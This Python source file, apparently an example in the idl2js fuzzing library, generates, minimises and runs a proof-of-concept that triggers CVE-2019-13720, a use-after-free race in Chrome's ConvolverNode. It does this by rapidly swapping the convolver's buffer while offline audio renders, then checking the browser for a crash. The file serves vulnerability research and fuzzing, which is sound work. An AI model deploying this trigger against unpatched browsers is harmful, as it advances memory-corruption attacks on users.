"""CVE-2019-13720 targeted fuzzer.

Use-after-free in Chrome ConvolverNode (Chrome 76-77, fixed in 78.0.3904.87).
The bug is a race condition: the main thread calls SetBuffer(null) freeing
reverb_ while the audio rendering thread still reads it via Process().

This fuzzer uses idl2js post_actions to generate the full PoC from WebIDL
definitions. Constructor parameters and method arguments are fuzzed. An oracle
checks whether the fuzzed parameters create a viable race window.
"""

import argparse
import re
from pathlib import Path

from idl2js.execution import BrowserRunner, DockerRunner
from idl2js.fuzzer import Fuzzer


EXAMPLES_DIR = Path(__file__).parent
IDL_FILE = str(EXAMPLES_DIR / 'cve_2019_13720.webidl')
MAX_SAMPLES = 200

VALID_SAMPLE_RATES = (8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000)
MIN_SAMPLE_RATE = 3000
MAX_SAMPLE_RATE = 384000
MIN_LENGTH_FOR_RACE = 0x1000
MAX_LENGTH = 0x2000000
MAX_BUFFER_CHANNELS = 32
RACE_ITERATIONS = 10000

POST_ACTIONS = [
    {'kind': 'call', 'method': 'createConvolver'},
    {'kind': 'call', 'method': 'createScriptProcessor'},
    {'kind': 'call', 'method': 'createBuffer'},
    {'kind': 'call', 'on': 'ConvolverNode', 'method': 'connect',
     'args': ['ScriptProcessorNode']},
    {'kind': 'call', 'on': 'ScriptProcessorNode', 'method': 'connect',
     'args': [{'prop': 'destination', 'of': 'OfflineAudioContext'}]},
    {'kind': 'set', 'on': 'ConvolverNode', 'prop': 'buffer',
     'value': 'AudioBuffer'},
    {'kind': 'call', 'method': 'startRendering'},
    {'kind': 'loop', 'iterations': RACE_ITERATIONS, 'body': [
        {'kind': 'set', 'on': 'ConvolverNode', 'prop': 'buffer', 'value': None},
        {'kind': 'set', 'on': 'ConvolverNode', 'prop': 'buffer', 'value': 'AudioBuffer'},
    ]},
]

OPTIONS = {
    'OfflineAudioContext': {
        'post_actions': POST_ACTIONS,
    },
}


def parse_js_output(sample):
    """Parse generated JS statements into variable bindings and constructor calls.

    Returns:
        (vars, constructors) where:
        - vars: {var_name: raw_value_string}
        - constructors: [(type_name, [resolved_arg_values])]
    """
    variables = {}
    constructors = []

    var_pattern = re.compile(
        r'try \{(v_\w+) = (.+?)\} catch',
    )
    ctor_pattern = re.compile(
        r'try \{(v_\w+) = new (\w+)\(([^)]*)\)\} catch',
    )

    for stmt in sample:
        text = str(stmt)

        m = ctor_pattern.search(text)
        if m:
            var_name, type_name, args_str = m.groups()
            arg_refs = [a.strip() for a in args_str.split(',') if a.strip()]
            resolved = []
            for ref in arg_refs:
                if ref in variables:
                    resolved.append(variables[ref])
                else:
                    resolved.append(ref)
            constructors.append((type_name, resolved))
            variables[var_name] = f'new {type_name}(...)'
            continue

        m = var_pattern.search(text)
        if m:
            var_name, raw_value = m.groups()
            variables[var_name] = raw_value
            continue

    return variables, constructors


def _parse_number(s):
    """Parse a string as int or float, return None on failure."""
    try:
        if '.' in s or 'e' in s.lower() or s.lower() in ('inf', '-inf', 'nan'):
            return float(s)
        return int(s)
    except (ValueError, TypeError):
        return None


def extract_params(sample):
    """Extract OfflineAudioContext and createBuffer params from a generated sample.

    Returns:
        dict with keys: numberOfChannels, length, sampleRate (from OfflineAudioContext)
        and buf_numberOfChannels, buf_length, buf_sampleRate (from createBuffer).
        Missing values are None.
    """
    _, constructors = parse_js_output(sample)
    params = {}

    for type_name, args in constructors:
        if type_name == 'OfflineAudioContext' and len(args) >= 3:
            params['numberOfChannels'] = _parse_number(args[0])
            params['length'] = _parse_number(args[1])
            params['sampleRate'] = _parse_number(args[2])

    variables, _ = parse_js_output(sample)
    call_pattern = re.compile(
        r'try \{(\w+) = (\w+)\.createBuffer\(([^)]*)\)\} catch',
    )
    for stmt in sample:
        text = str(stmt)
        m = call_pattern.search(text)
        if m:
            _, _, args_str = m.groups()
            args = [a.strip() for a in args_str.split(',') if a.strip()]
            resolved = [variables.get(a, a) for a in args]
            if len(resolved) >= 3:
                params['buf_numberOfChannels'] = _parse_number(resolved[0])
                params['buf_length'] = _parse_number(resolved[1])
                params['buf_sampleRate'] = _parse_number(resolved[2])

    return params


def oracle(params):
    """Check if fuzzed params create a structurally viable race window.

    Returns:
        (is_viable, detail_dict_or_None)

    The race requires:
    - numberOfChannels in {1, 2} (stereo convolver path, the one with the bug)
    - length >= 0x1000 (enough audio frames for rendering thread to be active)
    - sampleRate > 0 (must be positive for the AudioContext to be created)
    """
    channels = params.get('numberOfChannels')
    length = params.get('length')
    sample_rate = params.get('sampleRate')

    if channels is None or length is None or sample_rate is None:
        return False, None

    if not isinstance(channels, (int, float)):
        return False, None
    if not isinstance(length, (int, float)):
        return False, None
    if not isinstance(sample_rate, (int, float)):
        return False, None

    channels = int(channels)
    length = int(length)
    sample_rate = float(sample_rate)

    if channels not in (1, 2):
        return False, None

    if length < MIN_LENGTH_FOR_RACE:
        return False, None

    if not (sample_rate > 0):
        return False, None

    detail = {
        'numberOfChannels': channels,
        'length': length,
        'sampleRate': sample_rate,
    }
    return True, detail


def _clamp(value, lo, hi):
    return max(lo, min(hi, value))


def _nearest_sample_rate(value):
    return min(VALID_SAMPLE_RATES, key=lambda r: abs(r - value))


def fixup_poc_js(poc_js):
    """Clamp out-of-range numeric literals to Chrome-valid values.

    The fuzzer generates random unsigned long / float values.  Chrome rejects
    values outside its accepted ranges (e.g. sampleRate must be in
    [3000, 384000]).  This function rewrites the JS source so that every
    constructor and createBuffer call uses Chrome-valid parameters while
    preserving the PoC structure that the fuzzer discovered.
    """
    # Match: new OfflineAudioContext(channels_var, length_var, rate_var)
    # The variables are assigned as: try {v_xxx = <value>} catch(e){}
    # We find all variable assignments and the constructor call, then
    # rewrite the variable assignments with clamped values.

    var_pattern = re.compile(r'try \{(v_\w+) = ([^}]+)\} catch')

    # First pass: collect all variable names → values
    var_values = {}
    for m in var_pattern.finditer(poc_js):
        var_values[m.group(1)] = m.group(2)

    # Find OfflineAudioContext constructor args
    ctor_pat = re.compile(
        r'new OfflineAudioContext\((\w+),\s*(\w+),\s*(\w+)\)'
    )
    ctor_m = ctor_pat.search(poc_js)
    if not ctor_m:
        return poc_js

    ch_var, len_var, sr_var = ctor_m.groups()

    # Find createBuffer args
    buf_pat = re.compile(r'\.createBuffer\((\w+),\s*(\w+),\s*(\w+)\)')
    buf_m = buf_pat.search(poc_js)

    replacements = {}

    # Clamp OfflineAudioContext params
    if ch_var in var_values:
        ch = _parse_number(var_values[ch_var])
        if ch is not None:
            replacements[ch_var] = str(_clamp(int(ch), 1, 2))
    if len_var in var_values:
        length = _parse_number(var_values[len_var])
        if length is not None:
            replacements[len_var] = str(_clamp(int(length), MIN_LENGTH_FOR_RACE, MAX_LENGTH))
    if sr_var in var_values:
        sr = _parse_number(var_values[sr_var])
        if sr is not None:
            replacements[sr_var] = str(_nearest_sample_rate(abs(sr)))

    # Clamp createBuffer params
    if buf_m:
        buf_ch_var, buf_len_var, buf_sr_var = buf_m.groups()
        if buf_ch_var in var_values:
            bch = _parse_number(var_values[buf_ch_var])
            if bch is not None:
                replacements[buf_ch_var] = str(_clamp(int(abs(bch)) or 1, 1, MAX_BUFFER_CHANNELS))
        if buf_len_var in var_values:
            blen = _parse_number(var_values[buf_len_var])
            if blen is not None:
                replacements[buf_len_var] = str(_clamp(int(abs(blen)) or 1, 1, 65536))
        if buf_sr_var in var_values:
            bsr = _parse_number(var_values[buf_sr_var])
            if bsr is not None:
                replacements[buf_sr_var] = str(_nearest_sample_rate(abs(bsr)))

    # Apply replacements
    result = poc_js
    for var_name, new_val in replacements.items():
        old_val = var_values[var_name]
        result = result.replace(
            f'try {{{var_name} = {old_val}}}',
            f'try {{{var_name} = {new_val}}}',
        )

    return result


def hunt(fuzzer, max_samples=MAX_SAMPLES):
    """Generate samples and search for CVE-triggering parameters.

    Returns:
        (sample, choices, params, detail) on success, or None.
    """
    for sample, choices in fuzzer.recorded_samples(
        'OfflineAudioContext', count=max_samples, options=OPTIONS,
    ):
        params = extract_params(sample)
        found, detail = oracle(params)
        if found:
            return sample, choices, params, detail
    return None


def shrink_and_report(fuzzer, sample, choices, params, detail):
    """Shrink a triggering sample and print the CVE report."""
    def predicate(s):
        p = extract_params(s)
        found, _ = oracle(p)
        return found

    minimal, minimal_choices = fuzzer.shrink(
        'OfflineAudioContext', choices, predicate, options=OPTIONS,
    )
    still_valid, minimal_detail = oracle(extract_params(minimal))

    if not still_valid:
        minimal = sample
        minimal_choices = choices
        minimal_detail = detail

    cve_id = 'CVE-2019-13720'
    description = 'ConvolverNode use-after-free race condition'
    browser = 'Chrome 76-77 (fixed in 78.0.3904.87)'

    print(f'\n{"=" * 64}')
    print(f'  {cve_id} — {description}')
    print(f'  Affected: {browser}')
    print(f'{"=" * 64}')

    print(f'\n  Trigger: {detail}')

    print(f'\n  Original ({len(choices)} choices):')
    for inst in sample:
        print(f'    {inst}')

    shrunk = len(minimal_choices) < len(choices)
    if shrunk:
        print(f'\n  Shrunk to {len(minimal_choices)} choices '
              f'(was {len(choices)}):')
        for inst in minimal:
            print(f'    {inst}')
        print(f'\n  Minimized trigger: {minimal_detail}')
    else:
        print('\n  (Could not shrink further)')

    print(f'\n  Generated PoC:')
    for inst in minimal:
        print(f'    {inst}')

    print()
    return minimal


def execute_poc(runner, poc_js):
    """Run PoC against a real JS engine and check for crash/timeout.

    Returns:
        Outcome from the runner.
    """
    outcome = runner.run(poc_js)
    if outcome.is_crash:
        print(f'  [CRASH] signal={outcome.signal} '
              f'(duration={outcome.duration_ms:.0f}ms)')
        if outcome.stderr:
            print(f'  stderr: {outcome.stderr[:500]}')
    elif outcome.is_timeout:
        print(f'  [TIMEOUT] no crash within {outcome.duration_ms:.0f}ms')
    else:
        print(f'  [OK] exit_code={outcome.exit_code} '
              f'(duration={outcome.duration_ms:.0f}ms)')
    return outcome


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2019-13720 targeted fuzzer — '
                    'ConvolverNode use-after-free (Chrome 76-77)',
    )
    parser.add_argument(
        '--chrome', metavar='PATH', default=None,
        help='Chrome binary path (default: auto-detect)',
    )
    parser.add_argument(
        '--docker-image', metavar='IMAGE', default=None,
        help='Docker image to run Chrome in (uses DockerRunner instead of BrowserRunner)',
    )
    parser.add_argument(
        '--timeout', metavar='MS', type=int, default=10000,
        help='Execution timeout in ms (default: 10000)',
    )
    parser.add_argument(
        '--max-samples', metavar='N', type=int, default=MAX_SAMPLES,
        help=f'Max samples to generate (default: {MAX_SAMPLES})',
    )
    parser.add_argument(
        '--runs', metavar='N', type=int, default=1,
        help='Number of times to execute each PoC (race is non-deterministic)',
    )
    args = parser.parse_args()

    fuzzer = Fuzzer(idls=(IDL_FILE,))

    print('CVE-2019-13720 Targeted Fuzzer')
    print('=' * 64)
    print(f'Generating up to {args.max_samples} samples...\n')

    result = hunt(fuzzer, max_samples=args.max_samples)
    if result is None:
        print(f'  CVE-2019-13720: not triggered in {args.max_samples} samples')
        return

    sample, choices, params, detail = result
    minimal = shrink_and_report(fuzzer, sample, choices, params, detail)

    if args.docker_image:
        runner = DockerRunner(
            image=args.docker_image,
            chrome_path=args.chrome or 'google-chrome',
            timeout_ms=args.timeout,
        )
    else:
        runner = BrowserRunner(chrome_path=args.chrome, timeout_ms=args.timeout)
    poc_js = '\n'.join(str(inst) for inst in minimal)
    poc_js = fixup_poc_js(poc_js)

    print(f'  Fixed-up PoC for Chrome:')
    for line in poc_js.split('\n'):
        print(f'    {line}')
    print()
    print(f'  Executing PoC against Chrome ({args.runs} run(s))...')
    for run_idx in range(1, args.runs + 1):
        if args.runs > 1:
            print(f'  --- Run {run_idx}/{args.runs} ---')
        outcome = execute_poc(runner, poc_js)
        if outcome.is_crash:
            print(f'  Crash detected on run {run_idx}!')
            break


if __name__ == '__main__':
    main()
